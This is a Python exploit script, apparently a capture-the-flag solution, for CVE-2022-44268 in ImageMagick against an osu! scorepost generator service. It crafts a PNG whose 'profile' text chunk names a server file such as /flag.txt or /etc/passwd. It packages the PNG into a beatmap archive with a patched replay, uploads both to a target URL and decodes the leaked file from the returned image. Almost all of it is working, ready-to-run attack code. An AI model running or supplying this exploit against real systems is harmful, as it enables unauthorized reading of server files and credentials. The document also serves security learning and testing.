#!/usr/bin/env python3
"""
CVE-2022-44268 Exploit for osu! scorepost generator
Combines PNG generation, .osz packaging, .osr patching, and flag extraction
"""
import struct
import zlib
import zipfile
import hashlib
import sys
import os

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

# ============================================================================
# PNG EXPLOIT GENERATION (CVE-2022-44268)
# ============================================================================

def create_png_chunk(chunk_type, data):
    """Create a PNG chunk with proper CRC"""
    chunk = struct.pack('>I', len(data)) + chunk_type + data
    crc = zlib.crc32(chunk_type + data) & 0xffffffff
    chunk += struct.pack('>I', crc)
    return chunk

def create_exploit_png(file_to_read="/flag.txt"):
    """Create a malicious PNG that exploits CVE-2022-44268"""
    print(f"[+] Creating exploit PNG to read: {file_to_read}")

    # PNG signature
    png = b'\x89PNG\r\n\x1a\n'

    # IHDR chunk (1920x1080 to match expected dimensions)
    width = 1920
    height = 1080
    ihdr_data = struct.pack('>IIBBBBB', width, height, 8, 2, 0, 0, 0)
    png += create_png_chunk(b'IHDR', ihdr_data)

    # Malicious tEXt chunk with "profile" keyword pointing to the file
    # CVE-2022-44268: ImageMagick will read this file and embed it in output
    keyword = b'profile'
    text_data = keyword + b'\x00' + file_to_read.encode('latin-1')
    png += create_png_chunk(b'tEXt', text_data)

    # IDAT chunk - create proper image data for the dimensions
    # Each scanline: 1 filter byte + width * 3 bytes (RGB)
    scanline = b'\x00' + (b'\x00\x00\x00' * width)  # Black pixels
    raw_data = scanline * height
    idat_data = zlib.compress(raw_data, 9)
    png += create_png_chunk(b'IDAT', idat_data)

    # IEND chunk
    png += create_png_chunk(b'IEND', b'')

    return png

# ============================================================================
# OSZ PACKAGE CREATION
# ============================================================================

def create_beatmap_file(bg_filename="bg.png"):
    """Create a minimal .osu beatmap file"""
    beatmap = f"""osu file format v14

[General]
AudioFilename: audio.mp3
AudioLeadIn: 0
PreviewTime: -1
Countdown: 0
SampleSet: Normal
StackLeniency: 0.7
Mode: 0
LetterboxInBreaks: 0
WidescreenStoryboard: 1

[Editor]
DistanceSpacing: 1
BeatDivisor: 4
GridSize: 4
TimelineZoom: 1

[Metadata]
Title:Exploit - RCE Test
TitleUnicode:Exploit - RCE Test
Artist:Hacker
ArtistUnicode:Hacker
Creator:pwned
Version:Insane
Source:
Tags:ctf exploit cve
BeatmapID:0
BeatmapSetID:0

[Difficulty]
HPDrainRate:5
CircleSize:4
OverallDifficulty:5
ApproachRate:5
SliderMultiplier:1.4
SliderTickRate:1

[Events]
//Background and Video events
0,0,"{bg_filename}",0,0

[TimingPoints]
0,500,4,2,0,50,1,0

[HitObjects]
256,192,0,1,0,0:0:0:0:
"""
    return beatmap.encode('utf-8')

def create_osz(png_data, output_osz="exploit.osz"):
    """Package the exploit PNG into an .osz file"""
    print(f"[+] Creating .osz package: {output_osz}")

    # Create beatmap file
    beatmap_data = create_beatmap_file("bg.png")

    # Create the .osz (ZIP) file
    with zipfile.ZipFile(output_osz, 'w', zipfile.ZIP_DEFLATED) as osz:
        # Add beatmap file
        osz.writestr('beatmap.osu', beatmap_data)
        # Add background image
        osz.writestr('bg.png', png_data)
        # Add dummy audio file (required by format but not used)
        osz.writestr('audio.mp3', b'')

    # Calculate MD5 of beatmap for replay matching
    beatmap_md5 = hashlib.md5(beatmap_data).hexdigest()

    print(f"[+] Beatmap MD5: {beatmap_md5}")
    return beatmap_md5

# ============================================================================
# OSR REPLAY CREATION
# ============================================================================

def create_minimal_osr(output_path="replay.osr"):
    """Create a minimal valid .osr replay file"""
    print(f"[+] Creating minimal .osr file: {output_path}")

    data = bytearray()

    # Game mode (byte) - 0 for osu!standard
    data.append(0)

    # Version (int) - osu! version (e.g., 20210520)
    data.extend(struct.pack('<I', 20210520))

    # Beatmap MD5 hash (string) - will be patched later
    data.extend(write_osu_string("00000000000000000000000000000000"))

    # Player name (string)
    data.extend(write_osu_string("pwned"))

    # Replay MD5 hash (string)
    data.extend(write_osu_string("00000000000000000000000000000000"))

    # Number of 300s (short)
    data.extend(struct.pack('<H', 100))

    # Number of 100s (short)
    data.extend(struct.pack('<H', 0))

    # Number of 50s (short)
    data.extend(struct.pack('<H', 0))

    # Number of Gekis (short)
    data.extend(struct.pack('<H', 10))

    # Number of Katus (short)
    data.extend(struct.pack('<H', 0))

    # Number of misses (short)
    data.extend(struct.pack('<H', 0))

    # Total score (int)
    data.extend(struct.pack('<I', 1000000))

    # Max combo (short)
    data.extend(struct.pack('<H', 100))

    # Perfect combo (byte) - 0 or 1
    data.append(1)

    # Mods (int) - 0 for no mods
    data.extend(struct.pack('<I', 0))

    # Life bar graph (string) - empty
    data.extend(write_osu_string(""))

    # Timestamp (long) - Windows ticks
    data.extend(struct.pack('<Q', 637500000000000000))

    # Replay data length (int) - minimal replay data
    replay_data = b''  # Empty replay data
    compressed_replay = zlib.compress(replay_data)
    data.extend(struct.pack('<I', len(compressed_replay)))
    data.extend(compressed_replay)

    # Online score ID (long)
    data.extend(struct.pack('<q', -1))

    # Additional mod info (double) - optional, only for Target Practice
    # We'll skip this for standard mode

    with open(output_path, 'wb') as f:
        f.write(data)

    print(f"[+] Created minimal .osr file with player 'pwned'")

# ============================================================================
# OSR REPLAY PATCHING
# ============================================================================

def read_uleb128(data, offset):
    """Read ULEB128 encoded integer"""
    result = 0
    shift = 0
    while True:
        byte = data[offset]
        offset += 1
        result |= (byte & 0x7F) << shift
        if (byte & 0x80) == 0:
            break
        shift += 7
    return result, offset

def write_uleb128(value):
    """Write ULEB128 encoded integer"""
    result = bytearray()
    while True:
        byte = value & 0x7F
        value >>= 7
        if value != 0:
            byte |= 0x80
        result.append(byte)
        if value == 0:
            break
    return bytes(result)

def read_osu_string(data, offset):
    """Read osu! string format (0x0b flag + ULEB128 length + UTF-8 data)"""
    if data[offset] == 0x00:
        return "", offset + 1
    elif data[offset] == 0x0b:
        offset += 1
        length, offset = read_uleb128(data, offset)
        string = data[offset:offset+length].decode('utf-8')
        return string, offset + length
    else:
        raise ValueError(f"Invalid string flag: {data[offset]}")

def write_osu_string(string):
    """Write osu! string format"""
    if not string:
        return b'\x00'
    utf8_data = string.encode('utf-8')
    return b'\x0b' + write_uleb128(len(utf8_data)) + utf8_data

def patch_osr_beatmap_hash(osr_path, new_beatmap_md5, output_path):
    """Patch the beatmap MD5 hash in an .osr file"""
    print(f"[+] Patching .osr file: {osr_path}")

    with open(osr_path, 'rb') as f:
        data = bytearray(f.read())

    offset = 0

    # Read game mode (byte)
    game_mode = data[offset]
    offset += 1

    # Read version (int)
    version = struct.unpack('<I', data[offset:offset+4])[0]
    offset += 4

    # Read beatmap hash (string) - THIS IS WHAT WE PATCH
    old_hash, offset = read_osu_string(data, offset)
    print(f"[+] Old beatmap MD5: {old_hash}")
    print(f"[+] New beatmap MD5: {new_beatmap_md5}")

    # Read player name (string)
    player_name, name_offset = read_osu_string(data, offset)
    print(f"[+] Player name: {player_name}")

    # Reconstruct the file with new hash
    new_data = bytearray()
    new_data.append(game_mode)
    new_data.extend(struct.pack('<I', version))
    new_data.extend(write_osu_string(new_beatmap_md5))
    new_data.extend(data[offset:])  # Rest of the file

    with open(output_path, 'wb') as f:
        f.write(new_data)

    print(f"[+] Patched .osr saved to: {output_path}")

# ============================================================================
# FLAG EXTRACTION
# ============================================================================

def read_png_chunk(f):
    """Read a single PNG chunk"""
    length_data = f.read(4)
    if len(length_data) < 4:
        return None, None, None

    length = struct.unpack('>I', length_data)[0]
    chunk_type = f.read(4)
    chunk_data = f.read(length)
    crc = f.read(4)

    return chunk_type, chunk_data, length

def extract_flag_from_image(image_path):
    """Extract the embedded file data from the processed image by parsing PNG chunks"""
    print(f"[+] Extracting data from: {image_path}")

    with open(image_path, 'rb') as f:
        # Verify PNG signature
        signature = f.read(8)
        if signature != b'\x89PNG\r\n\x1a\n':
            print("[-] Not a valid PNG file")
            return None

        # Read all chunks and look for tEXt/zTXt chunks with profile data
        while True:
            chunk_type, chunk_data, length = read_png_chunk(f)

            if chunk_type is None:
                break

            # Look for tEXt chunks
            if chunk_type == b'tEXt':
                # Parse tEXt: keyword\0text
                try:
                    null_pos = chunk_data.index(b'\x00')
                    keyword = chunk_data[:null_pos].decode('latin-1')
                    text = chunk_data[null_pos+1:]

                    # Look for "Raw profile type" in the text
                    if b'Raw profile type' in text or keyword.startswith('Raw profile type'):
                        print(f"[+] Found raw profile in tEXt chunk")
                        # Parse the hex-encoded data
                        text_str = text.decode('latin-1', errors='ignore')
                        # Extract hex data (format: header\nlength\nhexdata)
                        lines = text_str.split('\n')
                        hex_data = ''
                        for line in lines[2:]:  # Skip header and length
                            hex_data += line.strip()

                        if hex_data:
                            try:
                                data = bytes.fromhex(hex_data)
                                return data
                            except ValueError:
                                continue
                except (ValueError, UnicodeDecodeError):
                    continue

            # Look for zTXt chunks (compressed text)
            elif chunk_type == b'zTXt':
                try:
                    null_pos = chunk_data.index(b'\x00')
                    keyword = chunk_data[:null_pos].decode('latin-1')
                    compression = chunk_data[null_pos+1]
                    compressed_text = chunk_data[null_pos+2:]

                    if compression == 0:  # zlib compression
                        text = zlib.decompress(compressed_text)

                        if b'Raw profile type' in keyword.encode() or b'Raw profile type' in text:
                            print(f"[+] Found raw profile in zTXt chunk")
                            text_str = text.decode('latin-1', errors='ignore')
                            lines = text_str.split('\n')
                            hex_data = ''
                            for line in lines[2:]:
                                hex_data += line.strip()

                            if hex_data:
                                try:
                                    data = bytes.fromhex(hex_data)
                                    return data
                                except ValueError:
                                    continue
                except (ValueError, UnicodeDecodeError, zlib.error):
                    continue

            # End of PNG
            elif chunk_type == b'IEND':
                break

    print("[-] No raw profile data found in image")
    return None

# ============================================================================
# REMOTE EXPLOITATION
# ============================================================================

def upload_and_download(target_url, osz_path, osr_path, output_path="downloaded.png"):
    """Upload exploit files to target and download the result"""
    if not HAS_REQUESTS:
        print("[-] Error: requests library not installed")
        print("    Install with: pip install requests")
        return False

    print(f"[+] Uploading to: {target_url}/api/submit")

    # Read the files
    with open(osz_path, 'rb') as f:
        osz_data = f.read()
    with open(osr_path, 'rb') as f:
        osr_data = f.read()

    print(f"[+] .osz size: {len(osz_data)} bytes")
    print(f"[+] .osr size: {len(osr_data)} bytes")

    # Upload
    files = {
        'osz': ('exploit.osz', osz_data, 'application/zip'),
        'osr': ('exploit.osr', osr_data, 'application/octet-stream')
    }

    try:
        response = requests.post(
            f"{target_url}/api/submit",
            files=files,
            allow_redirects=False,
            timeout=30
        )

        print(f"[+] Response status: {response.status_code}")

        if response.status_code == 200:
            # Check if it's actually an image
            content_type = response.headers.get('Content-Type', '')
            if 'image' in content_type:
                with open(output_path, 'wb') as f:
                    f.write(response.content)
                print(f"[+] Image downloaded to: {output_path}")
                print(f"[+] Image size: {len(response.content)} bytes")
                return True
            else:
                print(f"[-] Response is not an image: {content_type}")
                print(f"[-] Response preview: {response.content[:500]}")
                return False
        elif response.status_code == 302 or response.status_code == 301:
            location = response.headers.get('Location', '')
            print(f"[-] Redirected to: {location}")
            if 'error=' in location:
                import urllib.parse
                error = urllib.parse.unquote(location.split('error=')[1])
                print(f"[-] Error: {error}")
            return False
        else:
            print(f"[-] Unexpected status code: {response.status_code}")
            print(f"[-] Response: {response.content[:500]}")
            return False

    except Exception as e:
        print(f"[-] Error during upload: {e}")
        return False

# ============================================================================
# MAIN EXPLOIT WORKFLOW
# ============================================================================

def main():
    print("=" * 70)
    print("CVE-2022-44268 ImageMagick Exploit - osu! scorepost generator")
    print("=" * 70)
    print()

    if len(sys.argv) < 2:
        print("Usage:")
        print(f"  {sys.argv[0]} create [osr_file] [file_to_read]")
        print(f"  {sys.argv[0]} upload <target_url> [file_to_read]")
        print(f"  {sys.argv[0]} extract <output_image.png>")
        print()
        print("Examples:")
        print(f"  {sys.argv[0]} create                    # Auto-creates replay.osr, reads /flag.txt")
        print(f"  {sys.argv[0]} create /etc/passwd        # Auto-creates replay.osr, reads /etc/passwd")
        print(f"  {sys.argv[0]} create replay.osr /flag.txt")
        print(f"  {sys.argv[0]} upload https://target.com /flag.txt  # Create, upload, download & extract")
        print(f"  {sys.argv[0]} extract downloaded.png")
        sys.exit(1)

    mode = sys.argv[1]

    if mode == "create":
        # Smart argument parsing
        if len(sys.argv) < 3:
            # No arguments - use defaults
            osr_file = "replay.osr"
            file_to_read = "/flag.txt"
        elif len(sys.argv) == 3:
            # One argument - is it an osr file or file to read?
            arg = sys.argv[2]
            if arg.endswith('.osr'):
                # It's an osr file
                osr_file = arg
                file_to_read = "/flag.txt"
            else:
                # It's a file to read
                osr_file = "replay.osr"
                file_to_read = arg
        else:
            # Two arguments - osr file and file to read
            osr_file = sys.argv[2]
            file_to_read = sys.argv[3]

        # Auto-create replay file if it doesn't exist
        if not os.path.exists(osr_file):
            print(f"[*] {osr_file} not found, creating minimal replay file...")
            create_minimal_osr(osr_file)
            print()

        print(f"[*] Target file to read: {file_to_read}")
        print()

        # Step 1: Create exploit PNG
        exploit_png = create_exploit_png(file_to_read)

        # Step 2: Package into .osz
        beatmap_md5 = create_osz(exploit_png, "exploit.osz")

        # Step 3: Patch .osr file
        patch_osr_beatmap_hash(osr_file, beatmap_md5, "exploit.osr")

        print()
        print("=" * 70)
        print("[+] SUCCESS! Exploit files created:")
        print("    - exploit.osz (beatmap package with malicious PNG)")
        print("    - exploit.osr (patched replay file)")
        print()
        print("[!] Next steps:")
        print("    1. Upload exploit.osz and exploit.osr to the target")
        print("    2. Download the generated scorepost image")
        print(f"    3. Extract flag: {sys.argv[0]} extract <image.png>")
        print("=" * 70)

    elif mode == "upload":
        if len(sys.argv) < 3:
            print("[-] Error: target URL required")
            print(f"Usage: {sys.argv[0]} upload <target_url> [file_to_read]")
            sys.exit(1)

        target_url = sys.argv[2]
        file_to_read = sys.argv[3] if len(sys.argv) > 3 else "/flag.txt"

        print(f"[*] Target URL: {target_url}")
        print(f"[*] File to read: {file_to_read}")
        print()

        # Step 1: Create exploit files
        osr_file = "replay.osr"
        if not os.path.exists(osr_file):
            print(f"[*] Creating minimal replay file...")
            create_minimal_osr(osr_file)
            print()

        print(f"[+] Creating exploit PNG to read: {file_to_read}")
        exploit_png = create_exploit_png(file_to_read)

        beatmap_md5 = create_osz(exploit_png, "exploit.osz")
        patch_osr_beatmap_hash(osr_file, beatmap_md5, "exploit.osr")

        print()
        print("[+] Exploit files created!")
        print()

        # Step 2: Upload and download
        success = upload_and_download(target_url, "exploit.osz", "exploit.osr", "downloaded.png")

        if success:
            print()
            print("[+] Attempting to extract flag...")
            print()

            # Step 3: Extract flag
            data = extract_flag_from_image("downloaded.png")

            if data:
                print()
                print("=" * 70)
                print(f"[+] FLAG EXTRACTED ({len(data)} bytes):")
                print("=" * 70)

                # Try to decode as text
                try:
                    text = data.decode('utf-8', errors='ignore')
                    print(text)
                except:
                    print(data)

                print("=" * 70)
                print()
                print(f"[+] Hex dump: {data.hex()}")
            else:
                print("[-] Failed to extract flag from image")
                print("[*] You can manually check downloaded.png")
        else:
            print()
            print("[-] Upload failed. Check error messages above.")

    elif mode == "extract":
        if len(sys.argv) < 3:
            print("[-] Error: image file required")
            print(f"Usage: {sys.argv[0]} extract <output_image.png>")
            sys.exit(1)

        image_path = sys.argv[2]

        if not os.path.exists(image_path):
            print(f"[-] Error: {image_path} not found")
            sys.exit(1)

        data = extract_flag_from_image(image_path)

        if data:
            print()
            print("=" * 70)
            print(f"[+] Extracted data ({len(data)} bytes):")
            print("=" * 70)

            # Try to decode as text
            try:
                text = data.decode('utf-8', errors='ignore')
                print(text)
            except:
                print(data)

            print("=" * 70)
            print()
            print(f"[+] Hex dump: {data.hex()}")
        else:
            print("[-] Failed to extract data")
            sys.exit(1)

    else:
        print(f"[-] Unknown mode: {mode}")
        print(f"Usage: {sys.argv[0]} <create|extract> ...")
        sys.exit(1)

if __name__ == "__main__":
    main()
